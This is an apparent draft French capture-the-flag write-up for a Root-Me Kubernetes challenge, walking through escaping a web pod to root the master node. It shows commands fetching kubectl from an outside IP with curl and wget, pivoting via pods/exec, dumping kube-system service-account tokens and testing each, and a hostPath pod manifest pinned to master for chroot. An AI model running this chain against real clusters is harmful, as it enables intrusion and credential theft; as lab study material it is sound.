---
draft: true
---

<!-- https://www.root-me.org/fr/Challenges/Realiste/Dans-ton-Kube?action_solution=voir#ancre_solution -->

# Compromission du node

Tout d’abord, regardons où nous nous trouvons :

```
$ hostname
webserver-56889d9bf8-gh9vg
```

Hum ca ne ressemble pas à un hostname standard... Confirmons que  c’est un environnement virtualisé en regardant l’environnement :

```
$ env | grep KUB
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
KUBERNETES_SERVICE_HOST=10.96.0.1
```

Ok on est sur un pod kubernetes, on récupère kubectl pour éviter de devoir requêter l’API en curl :

```
$ mkdir /tmp/.tmp
$ cd /tmp/.tmp
$ curl http://18.188.14.65:16309/kubectl > kubectl
$ chmod +x kubectl
$ export PATH=$PATH:/tmp/.tmp
```

On regarde si on a des voisins sur le même namespace :

```
$ kubectl get pods -o wide
NAME                         READY   STATUS    RESTARTS   AGE   IP            NODE    NOMINATED NODE   READINESS GATES
dev-57f659f775-4wr9p         1/1     Running   12         45d   10.244.2.19   node2   <none>           <none>
webserver-56889d9bf8-gh9vg   1/1     Running   5          48d   10.244.1.20   node1   <none>           <none>
```

Effectivement, en plus de notre pod il y a un pod de dev à côté. On retrouve également cette information dans /etc/hosts.

Puis on va regarder quelles sont nos permissions :

```
$ kubectl auth can-i --list
Resources                                       Non-Resource URLs   Resource Names   Verbs
pods/exec                                       []                  []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
nodes                                           []                  []               [get watch list]
pods                                            []                  []               [get watch list]
                                                [/api/*]            []               [get]
                                                [/api]              []               [get]
                                                [/apis/*]           []               [get]
                                                [/apis]             []               [get]
                                                [/healthz]          []               [get]
                                                [/healthz]          []               [get]
                                                [/openapi/*]        []               [get]
                                                [/openapi]          []               [get]
                                                [/version/]         []               [get]
                                                [/version/]         []               [get]
                                                [/version]          []               [get]
                                                [/version]          []               [get]
```

On remarque que notre utilisateur peut exécuter du code grâce à la permission pods/exec.

# Pivot sur le pod dev

On peut alors exécuter du code sur le pod dev :

```
$ ./kubectl exec dev-57f659f775-4wr9p -- hostname
dev-57f659f775-4wr9p
$ ./kubectl exec dev-57f659f775-4wr9p -- whoami
root
```

On répète la manip pour récupérer kubectl sur le pod dev, avec wget cette fois :

```
./kubectl exec dev-57f659f775-4wr9p -- wget http://18.188.14.65:16309/kubectl -O /tmp/.tmp/kubectl
```

A-t-on de nouveaux droits grâce à l’exécution de code sur le pod dev ?

```
$ ./kubectl exec dev-57f659f775-4wr9p -- /tmp/.tmp/kubectl auth can-i --list
Resources                                       Non-Resource URLs   Resource Names   Verbs
pods/exec                                       []                  []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
nodes                                           []                  []               [get watch list]
pods                                            []                  []               [get watch list]
secrets                                         []                  []               [get watch list]
                                                [/api/*]            []               [get]
                                                [/api]              []               [get]
                                                [/apis/*]           []               [get]
                                                [/apis]             []               [get]
                                                [/healthz]          []               [get]
                                                [/healthz]          []               [get]
                                                [/openapi/*]        []               [get]
                                                [/openapi]          []               [get]
                                                [/version/]         []               [get]
                                                [/version/]         []               [get]
                                                [/version]          []               [get]
                                                [/version]          []               [get]
```

Oui ! Grâce à la permission ’secrets’ On peut maintenant lister et  piller les secrets des deux namespaces, ’default’ et ’kube-system’.

```
$ ./kubectl exec dev-57f659f775-4wr9p -- /tmp/.tmp/kubectl get secrets --namespace=default
NAME                           TYPE                                  DATA   AGE
default-token-thvrd            kubernetes.io/service-account-token   3      94d
devaccount-token-kjr8n         kubernetes.io/service-account-token   3      94d
webserveraccount-token-v9fnm   kubernetes.io/service-account-token   3      94d
$ ./kubectl exec dev-57f659f775-4wr9p -- /tmp/.tmp/kubectl get secrets --namespace=kube-system
NAME                                             TYPE                                  DATA   AGE
attachdetach-controller-token-cwtdw              kubernetes.io/service-account-token   3      94d
bootstrap-signer-token-5z4qw                     kubernetes.io/service-account-token   3      94d
certificate-controller-token-bp7dt               kubernetes.io/service-account-token   3      94d
clusterrole-aggregation-controller-token-ctnkr   kubernetes.io/service-account-token   3      94d
coredns-token-jgt4j                              kubernetes.io/service-account-token   3      94d
cronjob-controller-token-j47wz                   kubernetes.io/service-account-token   3      94d
daemon-set-controller-token-zqs9v                kubernetes.io/service-account-token   3      94d
default-token-6mxkk                              kubernetes.io/service-account-token   3      94d
deployment-controller-token-22wzx                kubernetes.io/service-account-token   3      94d
disruption-controller-token-62wcg                kubernetes.io/service-account-token   3      94d
endpoint-controller-token-vcndc                  kubernetes.io/service-account-token   3      94d
expand-controller-token-crkl8                    kubernetes.io/service-account-token   3      94d
flannel-token-jwvnh                              kubernetes.io/service-account-token   3      94d
generic-garbage-collector-token-2574p            kubernetes.io/service-account-token   3      94d
horizontal-pod-autoscaler-token-ttftk            kubernetes.io/service-account-token   3      94d
job-controller-token-jqwfw                       kubernetes.io/service-account-token   3      94d
kube-proxy-token-5vpm5                           kubernetes.io/service-account-token   3      94d
namespace-controller-token-zq24j                 kubernetes.io/service-account-token   3      94d
node-controller-token-9xhkh                      kubernetes.io/service-account-token   3      94d
persistent-volume-binder-token-m6k66             kubernetes.io/service-account-token   3      94d
pod-garbage-collector-token-kt78d                kubernetes.io/service-account-token   3      94d
pv-protection-controller-token-4tc4s             kubernetes.io/service-account-token   3      94d
pvc-protection-controller-token-bdr5x            kubernetes.io/service-account-token   3      94d
replicaset-controller-token-d5thb                kubernetes.io/service-account-token   3      94d
replication-controller-token-99znx               kubernetes.io/service-account-token   3      94d
resourcequota-controller-token-c7k8h             kubernetes.io/service-account-token   3      94d
service-account-controller-token-92sdh           kubernetes.io/service-account-token   3      94d
service-controller-token-b5q7z                   kubernetes.io/service-account-token   3      94d
statefulset-controller-token-psgwj               kubernetes.io/service-account-token   3      94d
token-cleaner-token-gjptt                        kubernetes.io/service-account-token   3      94d
ttl-controller-token-5h5rt                       kubernetes.io/service-account-token   3      94d
```

# Identification d’un compte privilégié

A ce stade on va essayer de trouver un compte plus privilégié que dev :

```
$ ./kubectl exec dev-57f659f775-4wr9p -- /tmp/.tmp/kubectl describe secrets --namespace=kube-system | grep token: | sed -e 's/token:\s\+//' > tokens
$ while read -r token; do kubectl --token=$token auth can-i --list; done < tokens
...
Resources                                       Non-Resource URLs   Resource Names   Verbs
*.*                                             []                  []               [*]
                                                [*]                 []               [*]
selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
                                                [/api/*]            []               [get]
                                                [/api]              []               [get]
                                                [/apis/*]           []               [get]
                                                [/apis]             []               [get]
                                                [/healthz]          []               [get]
                                                [/healthz]          []               [get]
                                                [/openapi/*]        []               [get]
                                                [/openapi]          []               [get]
                                                [/version/]         []               [get]
                                                [/version/]         []               [get]
                                                [/version]          []               [get]
                                                [/version]          []               [get]
...
```

Ca fait beaucoup de wildcards pour l’utilisateur clusterrole-aggregation-controller-token-ctnkr non ? On va donc utiliser son token par la suite.

# Création d’un pod pour rooter master

Le problème des deux pods que nous avions avant c’est qu’ils tournent respectivement sur node1 et node2, alors que l’on veut rooter master.  On va donc créer un pod en indiquant qu’il doit tourner sur le noeud  master et qui montera le filesystem de master, d’une manière similaire à la façon dont on peut rooter un docker avec une socket exposée dans le  guest. Le fichier de configuration du pod est une simple description au  format yaml des besoins du pod :

```
apiVersion: v1
kind: Pod
metadata:
  annotations:
  labels:
  name: attack-pod2
  namespace: default
spec:
  containers:
  - command:
    - sleep
    - "3600"
    image: busybox:latest
    imagePullPolicy: IfNotPresent
    name: attack-container
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  nodeSelector:
    kubernetes.io/hostname: master
```

On va alors le lancer puis vérifier que notre nouveau pod tourne sur le bon noeud :

```
$ ./kubectl --token=$TOKEN apply -f attack-pod2.yaml
pod/attack-pod2 created
$ ./kubectl --token=$TOKEN get pods -o wide
NAME                         READY   STATUS    RESTARTS   AGE   IP            NODE     NOMINATED NODE   READINESS GATES
attack-pod2                  1/1     Running   0          8s    10.244.0.52   master   <none>           <none>
dev-57f659f775-4wr9p         1/1     Running   13         45d   10.244.2.19   node2    <none>           <none>
webserver-56889d9bf8-gh9vg   1/1     Running   5          48d   10.244.1.20   node1    <none>           <none>
```

On peut alors se connecter au pod puis chroot sur le FS de master :

```
$ ./kubectl --token=$TOKEN exec attack-pod2 -it /bin/sh
chroot /root
root@attack-pod2:/# cat /etc/hosts
cat /etc/hosts
127.0.0.1   localhost
127.0.1.1   master  master
```

Et c’est gagné !